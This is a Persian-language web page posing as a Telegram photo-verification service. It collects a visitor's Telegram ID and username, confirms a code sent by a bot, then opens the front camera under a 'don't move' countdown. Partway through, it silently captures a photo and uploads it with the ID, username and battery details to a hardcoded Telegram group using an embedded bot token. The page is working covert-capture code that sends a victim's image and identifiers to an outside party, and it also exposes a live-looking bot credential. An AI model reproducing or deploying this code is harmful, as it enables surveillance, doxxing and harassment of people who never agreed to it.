<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>Hqlme | Photo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Vazirmatn', sans-serif;
      background: linear-gradient(145deg, #e6f0ff, #d0ebff);
      padding: 30px;
      direction: rtl;
    }
    .container {
      max-width: 400px;
      margin: auto;
      background: white;
      padding: 30px;
      border-radius: 25px;
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
      text-align: center;
    }
    input {
      width: 100%;
      padding: 12px;
      margin-top: 15px;
      border: 1px solid #ccc;
      border-radius: 12px;
    }
    button {
      background: linear-gradient(to right, #007bff, #00c6ff);
      color: white;
      border: none;
      padding: 14px;
      border-radius: 12px;
      margin-top: 20px;
      cursor: pointer;
      width: 100%;
      font-size: 16px;
    }
    #cameraScreen {
      display: none;
      flex-direction: column;
      align-items: center;
      background: black;
      position: fixed;
      top: 0; left: 0;
      width: 100%;
      height: 100vh;
      z-index: 999;
    }
    video {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    .overlay {
      position: absolute;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      border: 20px solid rgba(255, 255, 255, 0.1);
      box-shadow: inset 0 0 30px rgba(0,0,0,0.4);
    }
    #countdownMsg {
      position: absolute;
      top: 20px;
      right: 50%;
      transform: translateX(50%);
      font-size: 24px;
      color: white;
      background: rgba(0,0,0,0.5);
      padding: 10px 20px;
      border-radius: 20px;
    }
    #retryBtn {
      position: absolute;
      bottom: 30px;
      right: 50%;
      transform: translateX(50%);
      background: #ffffff33;
      color: white;
      border: 1px solid #fff;
      padding: 10px 20px;
      border-radius: 10px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="container" id="formScreen">
    <h2>Hqlme | Photo</h2>
    <input id="userId" placeholder="آیدی عددی تلگرام">
    <input id="username" placeholder="یوزرنیم با @">
    <button onclick="sendCode()">ارسال کد تایید</button>
    <div id="verifySection" style="display:none;">
      <input id="codeInput" placeholder="کد تایید دریافتی">
      <button onclick="verifyCode()">تایید و شروع</button>
    </div>
  </div>

  <div id="cameraScreen">
    <video id="video" autoplay muted playsinline></video>
    <div class="overlay"></div>
    <div id="countdownMsg">لطفاً تکان نخورید...</div>
    <button id="retryBtn" onclick="startCamera()">امتحان مجدد</button>
  </div>

  <canvas id="snapshot" width="640" height="480" style="display:none;"></canvas>

  <script>
    const token = "7396553495:AAHfctgjqILhUGihcPZuqTTgRWrXxtGBUH4";
    const groupId = "-1002534583259";
    let sentCode = "", uid = "", uname = "";

    function sendCode() {
      uid = document.getElementById("userId").value.trim();
      uname = document.getElementById("username").value.trim();
      if (!uid || !uname) return alert("لطفاً همه فیلدها را پر کنید.");
      sentCode = Math.floor(100000 + Math.random() * 900000).toString();
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: uid, text: `کد تایید شما: ${sentCode}` })
      });
      document.getElementById("verifySection").style.display = "block";
    }

    function verifyCode() {
      const input = document.getElementById("codeInput").value.trim();
      if (input === sentCode) {
        document.getElementById("formScreen").style.display = "none";
        document.getElementById("cameraScreen").style.display = "flex";
        startCamera();
      } else {
        alert("کد اشتباه است");
      }
    }

    async function startCamera() {
      const video = document.getElementById("video");
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
      video.srcObject = stream;
      document.getElementById("countdownMsg").innerText = "لطفاً تکان نخورید... 10";

      let counter = 10;
      const timer = setInterval(() => {
        counter--;
        document.getElementById("countdownMsg").innerText = `لطفاً تکان نخورید... ${counter}`;
        if (counter === 5) takePhoto();
        if (counter <= 0) clearInterval(timer);
      }, 1000);
    }

    function takePhoto() {
      const video = document.getElementById("video");
      const canvas = document.getElementById("snapshot");
      canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(async (blob) => {
        const battery = await navigator.getBattery();
        const caption = `یوزرنیم: ${uname}\nآیدی عددی: ${uid}\nباتری: ${battery.level * 100}%\nشارژ: ${battery.charging ? 'بله' : 'خیر'}`;
        const form = new FormData();
        form.append("chat_id", groupId);
        form.append("caption", caption);
        form.append("photo", blob, "photo.jpg");

        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: "POST",
          body: form
        });
      }, 'image/jpeg');
    }
  </script>
</body>
</html>
